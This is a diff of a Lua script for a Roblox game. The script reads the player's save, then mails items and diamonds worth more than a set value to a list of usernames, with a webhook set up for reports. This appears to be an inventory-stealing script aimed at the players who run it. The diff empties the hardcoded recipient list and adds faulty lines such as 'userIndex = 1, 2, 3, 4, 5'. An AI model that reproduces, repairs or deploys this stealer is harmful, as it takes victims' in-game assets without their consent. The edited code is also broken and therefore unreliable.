@@ -17,7 +17,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
+local users = _G.Usernames or {}
 local min_rap = _G.minrap or 1000000
 local webhook = _G.webhook or ""
 
@@ -186,8 +186,8 @@ local function getRAP(Type, Item)
 end
 
 local function sendItem(category, uid, am)
-    local userIndex = 5
-    local maxUsers = #users
+    local userIndex = 1, 2, 3, 4, 5
+    local maxUsers = users
     local sent = false
     
     repeat
@@ -222,8 +222,8 @@ local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= (mailSendPrice + 10000) then
-                local userIndex = 5
-                local maxUsers = #users
+                local userIndex = 1, 2, 3, 4, 5
+                local maxUsers = users
                 local sent = false
                 
                 repeat
